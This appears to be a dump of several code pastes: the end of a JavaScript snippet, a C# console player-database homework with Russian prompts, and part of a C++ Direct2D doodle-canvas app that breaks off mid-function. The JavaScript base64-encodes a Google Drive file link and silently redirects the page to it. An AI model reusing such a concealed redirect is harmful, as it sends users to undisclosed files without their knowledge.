  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AdtSNWG9,Homework40,JohnJuly,C#,Thursday 27th of March 2025 10:19:32 AM CDT,"using System;
using System.Collections.Generic;

namespace Homework_40
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandAddPlayer = ""add"";
            const string CommandDeletePlayer = ""del"";
            const string CommandBanPlayer = ""ban"";
            const string CommandUnbanPlayer = ""unban"";
            const string CommandShowInfo = ""show"";
            const string CommandExitProgram = ""exit"";

            Database database = new Database();

            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Вы в меню базы данных игроков. Введите нужную команду для действия: "");
                Console.WriteLine($""Введите {CommandAddPlayer} чтобы добавить игрока."");
                Console.WriteLine($""Введите {CommandDeletePlayer} чтобы удалить игрока."");
                Console.WriteLine($""Введите {CommandBanPlayer} чтобы забанить игрока"");
                Console.WriteLine($""Введите {CommandUnbanPlayer} чтобы разбанить игрока"");
                Console.WriteLine($""Введите {CommandShowInfo} чтобы посмотреть информацию о всех игроках"");
                Console.WriteLine($""Введите {CommandExitProgram} чтобы выйти из программы"");

                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandAddPlayer:
                        database.AddPlayer();
                        break;

                    case CommandDeletePlayer:
                        database.DeletePlayer();
                        break;

                    case CommandBanPlayer:
                        database.BanPlayer();
                        break;

                    case CommandUnbanPlayer:
                        database.UnbanPlayer();
                        break;

                    case CommandShowInfo:
                        database.ShowPlayersList();
                        break;

                    case CommandExitProgram:
                        isWork = database.ExitProgram();
                        break;

                    default:
                        Console.WriteLine(""Неверная команда!"");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }
    }

    class Player
    {
        public Player(int id, string name, int level)
        {
            ID = id;
            Name = name;
            Level = level;
            IsBanned = false;
        }

        public int ID { get; private set; }
        public string Name { get; private set; }
        public int Level { get; private set; }

        public bool IsBanned { get; set; }

        public void ShowInfo()
        {
            Console.WriteLine($""ID Игрока: {ID}.Имя игрока: {Name}, Уровень игрока: {Level}, Доступ игрока(Забанен или нет): {IsBanned}"");
        }
    }

    class Database
    {
        private List<Player> _players;

        public Database()
        {
            _players = new List<Player>();
        }

        public void AddPlayer()
        {
            int id = ReadNumber(""Введите уникальный ID: "");

            Console.WriteLine(""Введите имя игрока: "");

            string name = Console.ReadLine();

            int level = ReadNumber(""Введите уровень игрока"");

            _players.Add(new Player(id, name, level));

            Console.WriteLine(""Игрок добавлен"");
        }

        public void DeletePlayer()
        {
            if (IsEmptyListPlayers() == true)
            {
                int numbeIDForDelete = ReadNumber(""Введите ID игрока которого хотите удалить: "");

                for (int i = 0; i < _players.Count; i++)
                {
                    if (_players[i].ID == numbeIDForDelete)
                    {
                        _players.RemoveAt(i);
                    }
                    else
                    {
                        Console.WriteLine(""Нет игрока с таким ID!"");
                    }
                }
            }
        }

        public void ShowPlayersList()
        {
            if (IsEmptyListPlayers() == true)
            {
                foreach (Player player in _players)
                {
                    player.ShowInfo();
                }
            }
        }

        public void BanPlayer()
        {
            int numberIDForBanned = ReadNumber(""Введите ID игрока чтобы забанить: "");

            for (int i = 0; i < _players.Count; i++)
            {
                if (_players[i].ID == numberIDForBanned)
                {
                    if (_players[i].IsBanned == false)
                    {
                        _players[i].IsBanned = true;
                    }
                    else
                    {
                        Console.WriteLine(""Игрок уже забанен"");
                    }
                }
                else
                {
                    Console.WriteLine(""Нет игрока с таким ID!"");
                }
            }
        }

        public void UnbanPlayer()
        {
            int numberIDForBanned = ReadNumber(""Введите ID игрока чтобы забанить: "");

            for (int i = 0; i < _players.Count; i++)
            {
                if (_players[i].ID == numberIDForBanned)
                {
                    if (_players[i].IsBanned == true)
                    {
                        _players[i].IsBanned = false;
                    }
                    else
                    {
                        Console.WriteLine(""Игрок уже разбанен"");
                    }
                }
                else
                {
                    Console.WriteLine(""Нет игрока с таким ID!"");
                }
            }
        }

        public bool ExitProgram()
        {
            Console.WriteLine(""Вы вышли из программы!"");

            return false;
        }

        private bool IsEmptyListPlayers()
        {
            bool isEmpty = true;

            if (_players.Count == 0)
            {
                isEmpty = false;
                Console.WriteLine(""Список пуст!"");
            }

            return isEmpty;
        }

        private int ReadNumber(string message)
        {
            int number = 0;
            bool isNumber = false;

            while (isNumber == false)
            {
                Console.Write(message);
                isNumber = int.TryParse(Console.ReadLine(), out number);
            }

            return number;
        }
    }
}
"
9xcRsJPk,Infinite Doodle Canvas Direct2D So-Called Performance Boosts But Still Laggy AF!,alien_fx_fiend,C++,Thursday 27th of March 2025 10:19:17 AM CDT,"==++ Here's the full source code for (file 1/1) ""D2D-Doodle.cpp""::: ++==
```D2D-Doodle.cpp
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <commdlg.h>
#include <d2d1.h>
#include <dwrite.h>
#include <string>  // add if not already included
#include <cmath>
#include <vector>
#include <mutex>
#include <fstream>
#include <thread>
#include <algorithm>
#include ""resource.h""

#pragma comment(lib, ""d2d1.lib"")
#pragma comment(lib, ""comctl32.lib"")

//----------------------------------------------------------------
// Data Structures and Globals
//----------------------------------------------------------------

struct DrawPoint {
    int x, y;
    DWORD timestamp;
    DrawPoint() : x(0), y(0), timestamp(0) {}
    DrawPoint(int px, int py) : x(px), y(py), timestamp(GetTickCount()) {}
};

struct SerializedStroke {
    std::vector<DrawPoint> points;
    COLORREF color;
    int brushSize;
    bool isEraser;
};

std::mutex strokeMutex;
std::vector<SerializedStroke> strokeHistory;
std::vector<DrawPoint> strokeBuffer;
const double MIN_DISTANCE = 2.0;

COLORREF currentBrushColor = RGB(24, 123, 205);
int brushSize = 10;
int currentStrokeBrushSize = 10;
bool isDrawing = false;
bool isEraserMode = false;
bool isPaintbrushSelected = true;
bool isSpacePressed = false;
POINT lastMousePos = { 0, 0 };

int scrollX = 0;
int scrollY = 0;
float gridZoomFactor = 1.0f;
bool showGrid = true;
bool useAlphaGrid = false;
int gridOpacity = 255;
// Global view transform for panning.
D2D1_MATRIX_3X2_F g_viewTransform = D2D1::Matrix3x2F::Identity();
const int GRID_SIZE = 100;

HINSTANCE hInst;
HWND hWnd;
//HWND hStatusBar = NULL;
// Global DirectWrite objects:
IDWriteFactory* pDWriteFactory = nullptr;
IDWriteTextFormat* pTextFormat = nullptr;
std::wstring g_statusText = L"""";
// Add DirectWrite globals and a global status string:
//IDWriteFactory* pDWriteFactory = nullptr;
//IDWriteTextFormat* pTextFormat = nullptr;
DWORD lastStatusUpdateTime = 0;
const DWORD STATUS_UPDATE_INTERVAL = 50;
HDC hStatusBufferDC = NULL;
HBITMAP hStatusBufferBitmap = NULL;

// Serialization globals
const wchar_t* STATE_FILE = L""canvas_state2.bin"";
bool isLoading = false;
bool sessionDirty = false;

// For Direct2D
ID2D1Factory* pFactory = nullptr;
ID2D1HwndRenderTarget* pRenderTarget = nullptr;
ID2D1BitmapRenderTarget* pOffscreenRT = nullptr;
bool offscreenDirty = true;
int lastOffscreenScrollX = 0;
int lastOffscreenScrollY = 0;

//----------------------------------------------------------------
// Function Declarations
//----------------------------------------------------------------

void SaveCanvasState();
void LoadCanvasStateAsync(HWND hwnd);
void UpdateStatus(HWND hwnd);
void InitializeStatusBuffer(HWND hStatus);
void UpdateOffscreenBuffer(HWND hwnd);
HRESULT CreateDeviceResources(HWND hwnd);
void DiscardDeviceResources();
void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY);
void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect);

//----------------------------------------------------------------
// Serialization Functions
//----------------------------------------------------------------

void SaveCanvasState() {
    std::ofstream file(STATE_FILE, std::ios::binary | std::ios::out);
    if (!file)
        return;
    file.write(reinterpret_cast<const char*>(&gridZoomFactor), sizeof(float));
    file.write(reinterpret_cast<const char*>(&showGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&useAlphaGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&gridOpacity), sizeof(int));
    file.write(reinterpret_cast<const char*>(&currentBrushColor), sizeof(COLORREF));
    file.write(reinterpret_cast<const char*>(&brushSize), sizeof(int));
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        size_t strokeCount = strokeHistory.size();
        file.write(reinterpret_cast<const char*>(&strokeCount), sizeof(size_t));
        for (const auto& stroke : strokeHistory) {
            std::vector<DrawPoint> optimizedPoints;
            if (!stroke.points.empty()) {
                optimizedPoints.push_back(stroke.points[0]);
                for (size_t i = 1; i < stroke.points.size(); ++i) {
                    const DrawPoint& prev = optimizedPoints.back();
                    const DrawPoint& curr = stroke.points[i];
                    double dx = curr.x - prev.x;
                    double dy = curr.y - prev.y;
                    double distance = sqrt(dx * dx + dy * dy);
                    if (distance >= MIN_DISTANCE)
                        optimizedPoints.push_back(curr);
                }
            }
            size_t pointCount = optimizedPoints.size();
            file.write(reinterpret_cast<const char*>(&pointCount), sizeof(size_t));
            if (pointCount > 0)
                file.write(reinterpret_cast<const char*>(optimizedPoints.data()), pointCount * sizeof(DrawPoint));
            file.write(reinterpret_cast<const char*>(&stroke.color), sizeof(COLORREF));
            file.write(reinterpret_cast<const char*>(&stroke.brushSize), sizeof(int));
            file.write(reinterpret_cast<const char*>(&stroke.isEraser), sizeof(bool));
        }
    }
    file.close();
}

void LoadCanvasStateAsync(HWND hwnd) {
    isLoading = true;
    std::thread([hwnd]() {
        std::ifstream file(STATE_FILE, std::ios::binary | std::ios::in);
        if (!file) {
            isLoading = false;
            return;
        }
        try {
            file.read(reinterpret_cast<char*>(&gridZoomFactor), sizeof(float));
            file.read(reinterpret_cast<char*>(&showGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&useAlphaGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&gridOpacity), sizeof(int));
            file.read(reinterpret_cast<char*>(&currentBrushColor), sizeof(COLORREF));
            file.read(reinterpret_cast<char*>(&brushSize), sizeof(int));
            size_t strokeCount = 0;
            file.read(reinterpret_cast<char*>(&strokeCount), sizeof(size_t));
            std::vector<SerializedStroke> loadedStrokes;
            for (size_t i = 0; i < strokeCount && file.good(); ++i) {
                SerializedStroke stroke;
                size_t pointCount = 0;
                file.read(reinterpret_cast<char*>(&pointCount), sizeof(size_t));
                if (pointCount > 0 && pointCount < 1000000) {
                    for (size_t j = 0; j < pointCount; ++j) {
                        DrawPoint point;
                        file.read(reinterpret_cast<char*>(&point.x), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.y), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.timestamp), sizeof(DWORD));
                        stroke.points.push_back(point);
                    }
                    file.read(reinterpret_cast<char*>(&stroke.color), sizeof(COLORREF));
                    file.read(reinterpret_cast<char*>(&stroke.brushSize), sizeof(int));
                    file.read(reinterpret_cast<char*>(&stroke.isEraser), sizeof(bool));
                    loadedStrokes.push_back(stroke);
                }
            }
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory = std::move(loadedStrokes);
            }
        }
        catch (...) {
            isLoading = false;
            return;
        }
        file.close();
        isLoading = false;
        // Post a message to update offscreen buffer after loading
        PostMessage(hwnd, WM_USER + 1, 0, 0);
        }).detach();
}

//----------------------------------------------------------------
// Direct2D Initialization and Resource Management
//----------------------------------------------------------------

HRESULT CreateDeviceResources(HWND hwnd) {
    if (pRenderTarget)
        return S_OK;
    RECT rc;
    GetClientRect(hwnd, &rc);
    D2D1_SIZE_U size = D2D1::SizeU(rc.right, rc.bottom);

    HRESULT hr = pFactory->CreateHwndRenderTarget(
        D2D1::RenderTargetProperties(),
        D2D1::HwndRenderTargetProperties(hwnd, size),
        &pRenderTarget
    );
    if (SUCCEEDED(hr)) {
        // Create an offscreen compatible render target for persistent drawing.
        hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rc.right, (FLOAT)rc.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr)) {
            // Mark offscreen as dirty so it is initially updated.
            offscreenDirty = true;
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
        }
    }
    return hr;
}

void DiscardDeviceResources() {
    if (pOffscreenRT) {
        pOffscreenRT->Release();
        pOffscreenRT = nullptr;
    }
    if (pRenderTarget) {
        pRenderTarget->Release();
        pRenderTarget = nullptr;
    }
}

//----------------------------------------------------------------
// Drawing Functions (Direct2D versions)
//----------------------------------------------------------------

void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY) {
    if (points.empty())
        return;

    // Determine color; for eraser use white.
    D2D1_COLOR_F color = isEraser ? D2D1::ColorF(D2D1::ColorF::White) :
        D2D1::ColorF(
            GetRValue(strokeColor) / 255.0f,
            GetGValue(strokeColor) / 255.0f,
            GetBValue(strokeColor) / 255.0f
        );

    ID2D1SolidColorBrush* pBrush = nullptr;
    if (FAILED(pRT->CreateSolidColorBrush(color, &pBrush)))
        return;

    if (points.size() == 1) {
        const DrawPoint& pt = points[0];
        D2D1_ELLIPSE ellipse = D2D1::Ellipse(
            D2D1::Point2F((FLOAT)(pt.x - offsetX), (FLOAT)(pt.y - offsetY)),
            (FLOAT)strokeSize, (FLOAT)strokeSize);
        pRT->FillEllipse(ellipse, pBrush);
    }
    else {
        for (size_t i = 1; i < points.size(); ++i) {
            const DrawPoint& prev = points[i - 1];
            const DrawPoint& curr = points[i];
            double dx = curr.x - prev.x;
            double dy = curr.y - prev.y;
            double distance = sqrt(dx * dx + dy * dy);
            if (distance > 0) {
                int steps = std::max(1, (int)(distance / 2));
                for (int step = 0; step <= steps; ++step) {
                    double t = step / (double)steps;
                    int x = (int)(prev.x + dx * t);
                    int y = (int)(prev.y + dy * t);
                    D2D1_ELLIPSE ellipse = D2D1::Ellipse(
                        D2D1::Point2F((FLOAT)(x - offsetX), (FLOAT)(y - offsetY)),
                        (FLOAT)strokeSize, (FLOAT)strokeSize);
                    pRT->FillEllipse(ellipse, pBrush);
                }
            }
        }
    }
    pBrush->Release();
}

void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect) {
    ID2D1SolidColorBrush* pGridBrush = nullptr;
    HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(1.0f, 0.55f, 0.0f), &pGridBrush);
    if (FAILED(hr)) return;
    int scaledGridSize = (int)(GRID_SIZE * gridZoomFactor);

    // Compute proper mod values so grid lines appear even for negative scrolls.
    int modX = scrollX % scaledGridSize;
    if (modX < 0)
        modX += scaledGridSize;
    // Determine starting X in world coordinates.
    float startX = (float)(scrollX - modX);
    int modY = scrollY % scaledGridSize;
    if (modY < 0)
        modY += scaledGridSize;
    float startY = (float)(scrollY - modY);

    // Draw vertical gridlines covering the rect.
    for (float x = startX; x < rect.right; x += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(x, rect.top), D2D1::Point2F(x, rect.bottom), pGridBrush, 1.0f);
    }
    // Draw horizontal gridlines covering the rect.
    for (float y = startY; y < rect.bottom; y += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(rect.left, y), D2D1::Point2F(rect.right, y), pGridBrush, 1.0f);
    }
    pGridBrush->Release();
}

//----------------------------------------------------------------
// Offscreen Buffer Update (using pOffscreenRT)
//----------------------------------------------------------------

void UpdateOffscreenBuffer(HWND hwnd) {
    if (!pOffscreenRT)
        return;
    pOffscreenRT->BeginDraw();
    // Clear offscreen render target to white.
    pOffscreenRT->Clear(D2D1::ColorF(D2D1::ColorF::White));
    // Redraw all strokes.
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        for (const auto& stroke : strokeHistory) {
            DrawSmoothStroke(pOffscreenRT, stroke.points, stroke.isEraser, stroke.color, stroke.brushSize, scrollX, scrollY);
        }
    }
    HRESULT hr = pOffscreenRT->EndDraw();
    // Mark offscreen as clean.
    offscreenDirty = false;
    lastOffscreenScrollX = scrollX;
    lastOffscreenScrollY = scrollY;
}

//----------------------------------------------------------------
// Status Bar Functions (GDI remains unchanged)
//----------------------------------------------------------------

void InitializeStatusBuffer(HWND hStatus) {
    if (hStatusBufferDC) {
        DeleteDC(hStatusBufferDC);
        DeleteObject(hStatusBufferBitmap);
    }
    HDC hdc = GetDC(hStatus);
    RECT rect;
    GetClientRect(hStatus, &rect);
    hStatusBufferDC = CreateCompatibleDC(hdc);
    hStatusBufferBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
    SelectObject(hStatusBufferDC, hStatusBufferBitmap);
    ReleaseDC(hStatus, hdc);
}

void UpdateStatus(HWND hwnd) {
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s | Zoom: %.1fx | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        gridZoomFactor,
        scrollX, scrollY
    );
    g_statusText = status;
}

/* void UpdateStatus(HWND hwnd) {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastStatusUpdateTime < STATUS_UPDATE_INTERVAL)
        return;
    lastStatusUpdateTime = currentTime;
    if (!hStatusBar)
        return;
    if (!hStatusBufferDC) {
        InitializeStatusBuffer(hStatusBar);
    }
    RECT statusRect;
    GetClientRect(hStatusBar, &statusRect);
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s%s | Zoom: %.1fx | Opacity: %d%% | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        useAlphaGrid ? L""(Alpha)"" : L"""",
        gridZoomFactor,
        (gridOpacity * 100) / 255,
        scrollX, scrollY
    );
    SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)status);
} */

//----------------------------------------------------------------
// Window Procedure
//----------------------------------------------------------------

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    HRESULT hr;
    switch (uMsg) {
    case WM_CREATE:
    {
        // Initialize Direct2D Factory
        HRESULT hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
        if (FAILED(hr))
            return -1;

        // Initialize DirectWrite Factory and Text Format for the status text.
        HRESULT hrDWrite = DWriteCreateFactory(
            DWRITE_FACTORY_TYPE_SHARED,
            __uuidof(IDWriteFactory),
            reinterpret_cast<IUnknown**>(&pDWriteFactory)
        );
        if (SUCCEEDED(hrDWrite))
        {
            hrDWrite = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"",                // Font family name.
                NULL,                       // Use system font collection.
                DWRITE_FONT_WEIGHT_NORMAL,
                DWRITE_FONT_STYLE_NORMAL,
                DWRITE_FONT_STRETCH_NORMAL,
                14.0f,                      // Font size.
                L"""",                        // Locale.
                &pTextFormat
            );
            if (SUCCEEDED(hrDWrite))
            {
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            }
        }

        // (Remove GDI status bar creation; status will be rendered via Direct2D.)

        // Device resources (pRenderTarget and pOffscreenRT) will be created in WM_SIZE.
        LoadCanvasStateAsync(hwnd);
        return 0;
    }
    case WM_SIZE:
    {
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);

        // Resize (or create) the main render target.
        if (pRenderTarget)
        {
            pRenderTarget->Resize(D2D1::SizeU(rcClient.right, rcClient.bottom));
        }
        else
        {
            HRESULT hr = CreateDeviceResources(hwnd);
            if (FAILED(hr))
                return -1;
        }

        // Recreate the offscreen render target.
        if (pOffscreenRT)
        {
            pOffscreenRT->Release();
            pOffscreenRT = nullptr;
        }
        HRESULT hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rcClient.right, (FLOAT)rcClient.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr))
        {
            offscreenDirty = true;               // Force update of the offscreen buffer.
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
            UpdateOffscreenBuffer(hwnd);         // Rebuild the offscreen content.
        }

        // Update status (which now contains the grid state) and force a full redraw.
        UpdateStatus(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        return 0;
    }
        case WM_KEYDOWN:
    {
            if (GetKeyState(VK_MENU) & 0x8000)
                return DefWindowProc(hwnd, uMsg, wParam, lParam);
            if (wParam == VK_LEFT) {
                scrollX -= 80; //default scroll for all arrowkeys = 20
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                InvalidateRect(hwnd, NULL, FALSE);
            }
            else if (wParam == VK_RIGHT) {
                scrollX += 80;
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                InvalidateRect(hwnd, NULL, FALSE);
            }
            else if (wParam == VK_UP) {
                scrollY -= 80;
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                InvalidateRect(hwnd, NULL, FALSE);
            }
            else if (wParam == VK_DOWN) {
                scrollY += 80;
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                InvalidateRect(hwnd, NULL, FALSE);
            }
        else if (wParam == VK_SPACE && !isSpacePressed) {
            isSpacePressed = true;
            GetCursorPos(&lastMousePos);
            ScreenToClient(hwnd, &lastMousePos);
            SetCursor(LoadCursor(NULL, IDC_SIZEALL));
            SetCapture(hwnd);
        }
        else if (wParam == 0x50) {
            isPaintbrushSelected = true;
            isEraserMode = false;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 0x45) {
            isPaintbrushSelected = false;
            isEraserMode = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'Q') {
            CHOOSECOLOR cc = { sizeof(CHOOSECOLOR) };
            static COLORREF customColors[16] = { 0 };
            cc.hwndOwner = hwnd;
            cc.rgbResult = currentBrushColor;
            cc.lpCustColors = customColors;
            cc.Flags = CC_FULLOPEN | CC_RGBINIT;
            if (ChooseColor(&cc))
                currentBrushColor = cc.rgbResult;
            UpdateStatus(hwnd);
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_ADD || wParam == VK_OEM_PLUS) {
            brushSize = std::min(50, brushSize + 5);
            offscreenDirty = true;  // Ensure new brush size is applied in drawing.
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_SUBTRACT || wParam == VK_OEM_MINUS) {
            brushSize = std::max(5, brushSize - 5);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 0x43) {
            std::lock_guard<std::mutex> lock(strokeMutex);
            strokeHistory.clear();
            sessionDirty = true;  // Mark session as changed.
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_HOME) {
                scrollX = 0;
                scrollY = 0;
                g_viewTransform = D2D1::Matrix3x2F::Translation(0.0f, 0.0f);
                InvalidateRect(hwnd, NULL, TRUE);
            }
        else if (wParam == 'G') {
            showGrid = !showGrid;
            offscreenDirty = true;  // Mark offscreen dirty so grid redraws.
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'A') {
            useAlphaGrid = !useAlphaGrid;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_PRIOR) {
            gridZoomFactor *= 1.1f;
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_NEXT) {
            gridZoomFactor *= 0.9f;
            if (gridZoomFactor < 0.1f)
                gridZoomFactor = 0.1f;
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_6 && useAlphaGrid) {
            gridOpacity = std::min(255, gridOpacity + 15);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_4 && useAlphaGrid) {
            gridOpacity = std::max(0, gridOpacity - 15);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_ESCAPE) {
            if (isSpacePressed) {
                isSpacePressed = false;
                ReleaseCapture();
            }
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            PostQuitMessage(0);
            return 0;
        }
        else if (wParam == VK_F1) {
            MessageBox(hwnd,
                L""Infinite Canvas Doodle App (Direct2D Accelerated)\n""
                L""P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow Keys=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About"",
                L""Information"", MB_OK | MB_ICONINFORMATION);
            return 0;
        }
        return 0;
    }
    case WM_KEYUP:
    {
        if (wParam == VK_SPACE) {
            isSpacePressed = false;
            SetCursor(LoadCursor(NULL, IDC_ARROW));
            ReleaseCapture();
            return 0;
        }
        return 0;
    }
    case WM_LBUTTONDOWN:
    {
        isDrawing = true;
        currentStrokeBrushSize = brushSize;
        int worldX = GET_X_LPARAM(lParam) + scrollX;
        int worldY = GET_Y_LPARAM(lParam) + scrollY;
        strokeBuffer.clear();
        strokeBuffer.push_back(DrawPoint(worldX, worldY));
        SetCapture(hwnd);
        InvalidateRect(hwnd, NULL, FALSE);
        return 0;
    }
    case WM_LBUTTONUP:
    {
        if (isDrawing) {
            isDrawing = false;
            SerializedStroke stroke;
            stroke.points = strokeBuffer;
            stroke.color = currentBrushColor;
            stroke.brushSize = brushSize;
            stroke.isEraser = isEraserMode;
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory.push_back(stroke);
            }
            strokeBuffer.clear();
            ReleaseCapture();
            InvalidateRect(hwnd, NULL, FALSE);
            sessionDirty = true;
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            offscreenDirty = true;
            UpdateOffscreenBuffer(hwnd);
            UpdateStatus(hwnd);
        }
        return 0;
    }
    case WM_MOUSEMOVE:
    {
        int x = GET_X_LPARAM(lParam);
        int y = GET_Y_LPARAM(lParam);
        if (isSpacePressed) {
            int deltaX = x - lastMousePos.x;
            int deltaY = y - lastMousePos.y;
            scrollX -= deltaX;
            scrollY -= deltaY;
            lastMousePos.x = x;
            lastMousePos.y = y;
            // Update the global view transform.
            g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
            UpdateStatus(hwnd);  // <-- Added: update status after panning.
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (isDrawing && (wParam & MK_LBUTTON)) {
            int worldX = x + scrollX;
            int worldY = y + scrollY;
            if (strokeBuffer.empty())
                strokeBuffer.push_back(DrawPoint(worldX, worldY));
            else {
                const DrawPoint& lastPt = strokeBuffer.back();
                double dx = worldX - lastPt.x;
                double dy = worldY - lastPt.y;
                double distance = sqrt(dx * dx + dy * dy);
                if (distance >= MIN_DISTANCE)
                    strokeBuffer.push_back(DrawPoint(worldX, worldY));
            }
            RECT dirty;
            int clientPrevX = strokeBuffer.back().x - scrollX;
            int clientPrevY = strokeBuffer.back().y - scrollY;
            int clientNewX = x;
            int clientNewY = y;
            dirty.left = std::min(clientPrevX, clientNewX) - brushSize;
            dirty.top = std::min(clientPrevY, clientNewY) - brushSize;
            dirty.right = std::max(clientPrevX, clientNewX) + brushSize;
            dirty.bottom = std::max(clientPrevY, clientNewY) + brushSize;
            InvalidateRect(hwnd, &dirty, FALSE);
        }
        return 0;
    }
    case WM_USER + 1:
    {
        // Custom message after state loading.
        offscreenDirty = true;
        UpdateOffscreenBuffer(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        break;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hwnd, &ps);

        pRenderTarget->BeginDraw();

        // Clear to white.
        pRenderTarget->Clear(D2D1::ColorF(D2D1::ColorF::White));

        // Set transform for panning (world coordinates).
        pRenderTarget->SetTransform(g_viewTransform);

        // Draw all strokes in world coordinates.
        {
            std::lock_guard<std::mutex> lock(strokeMutex);
            for (const auto& stroke : strokeHistory) {
                DrawSmoothStroke(pRenderTarget, stroke.points, stroke.isEraser, stroke.color, stroke.brushSize, 0, 0);
            }
        }
        if (isDrawing && !strokeBuffer.empty()) {
            DrawSmoothStroke(pRenderTarget, strokeBuffer, isEraserMode, currentBrushColor, currentStrokeBrushSize, 0, 0);
        }

        // Draw grid in world coordinates.
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);
